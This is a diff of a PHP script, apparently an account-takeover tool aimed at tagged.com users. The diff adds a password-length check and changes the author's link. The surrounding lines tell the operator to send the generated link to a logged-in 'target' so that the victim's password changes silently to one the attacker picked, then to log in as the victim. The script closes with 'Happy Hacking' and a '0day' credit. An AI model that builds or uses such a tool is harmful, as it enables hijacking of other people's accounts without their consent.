@@ -63,16 +63,19 @@ $data="<html>
 	</body>
 </html>"; //defines the data the HTML file should contain.
 //end variables
-
+if(strlen($pass)<8){
+	echo "<center><font color=\"red\"><h2>Your password must be at least 8 characters long</h2></center>";
+}
+else{
 fwrite ($write,$data); //writing the file
 fclose($write); //closing writing the file
 
 echo "<center><h2>Here is your <a href=\"$name\">LINK</a></h2>";
 echo "<b><font size=\"4\">Do not CLICK this LINK if you are logged into your tagged.com account</font></b><br/>";
 echo "Give this link to your target when (s)he is logged into his/her tagged.com account. If (s)he visits the link when (s)he is logged in, his/her password will automatically be changed into the password you have choosen. <br/>Now loginto his/her account using that password and email. <b>Happy Hacking</b>.</center>";
-
+}
 
 }
 
 ?>
-<body><center><font color="blue" size="5"><b>0day found and script coded by: <a href="http://www.zawad.science">Zawad</a></b></font></center></body>
+<body><center><font color="blue" size="5"><b>0day found and script coded by: <a href="http://www.zawad.me">Zawad</a></b></font></center></body>
